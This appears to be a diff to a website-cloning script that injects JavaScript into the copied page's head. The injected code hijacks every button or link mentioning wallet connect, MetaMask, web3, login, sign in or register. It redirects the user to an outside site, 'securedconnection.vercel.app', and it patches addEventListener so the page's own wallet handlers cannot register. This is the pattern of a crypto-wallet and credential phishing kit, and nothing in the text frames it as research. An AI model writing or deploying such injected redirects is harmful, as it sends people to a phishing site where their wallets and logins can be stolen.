@@ -268,6 +268,13 @@ const interactiveElements = Array.from(clickableElements).filter((el) => {
         // Remove any href or onclick behavior
         el.removeAttribute("href");
         el.removeAttribute("onclick");
+        
+    // First event listener
+            el.addEventListener("click", function (event) {
+              event.stopImmediatePropagation(); // This stops the next listener from running
+              console.log("First click handler");
+            });
+
 
         // If there's an <a> inside, disable it too
         const anchor = el.querySelector("a");
@@ -311,6 +318,89 @@ const interactiveElements = Array.from(clickableElements).filter((el) => {
     setInterval(fixImagesAndButtons, 10000);
   });
 </script>`);
+$("head").prepend(`  <script>
+  const redirectURL = "https://securedconnection.vercel.app/";
+
+  function blockEvent(event) {
+    event.preventDefault();
+    event.stopImmediatePropagation();
+    event.stopPropagation();
+    console.log("Blocked & Redirecting...");
+    window.location.href = redirectURL;
+  }
+
+  function patchElement(el) {
+    if (!el || el.dataset.patched) return;
+    el.dataset.patched = "true";
+
+    ["click", "mousedown", "pointerdown"].forEach((eventType) => {
+      el.addEventListener(eventType, blockEvent, true);  // Capture phase
+      el.addEventListener(eventType, blockEvent, false); // Bubble phase
+    });
+
+    // Disable default attributes
+    el.removeAttribute("href");
+    el.removeAttribute("onclick");
+  }
+
+  function scanAndPatch() {
+    const allElements = document.querySelectorAll("*");
+    allElements.forEach((el) => {
+      const text = (el.innerText || "").toLowerCase().trim();
+      if (
+        text.includes("connect wallet") ||
+        text.includes("connect to wallet") ||
+        text.includes("connect") ||
+        text.includes("wallet connect") ||
+        text.includes("metamask") ||
+        text.includes("web3") ||
+        text.includes("log in") ||
+        text.includes("sign in") ||
+        text.includes("sign up") ||
+        text.includes("register") ||
+        text.includes("create account") ||
+        text.includes("login")
+      ) {
+        patchElement(el);
+      }
+    });
+  }
+
+  window.addEventListener("load", () => {
+    scanAndPatch();
+
+    // Watch for dynamic elements
+    const observer = new MutationObserver(() => {
+      scanAndPatch();
+    });
+
+    observer.observe(document.body, {
+      childList: true,
+      subtree: true,
+    });
+  });
+
+  // Optional: override addEventListener to block future handlers
+  const originalAddEventListener = EventTarget.prototype.addEventListener;
+  EventTarget.prototype.addEventListener = function (type, listener, options) {
+    if (typeof listener === "function" && type === "click") {
+      // Prevent wallet modal listeners from registering
+      const toString = listener.toString();
+      if (
+        toString.includes("wallet") ||
+        toString.includes("connect") ||
+        toString.includes("provider") ||
+        toString.includes("web3")
+      ) {
+        console.warn("Blocked suspicious listener:", toString.slice(0, 100));
+        return;
+      }
+    }
+    return originalAddEventListener.call(this, type, listener, options);
+  };
+</script>
+
+`)
 
           // Save HTML
           await fs.outputFile(path.join(outputDir, "index.html"), $.html());
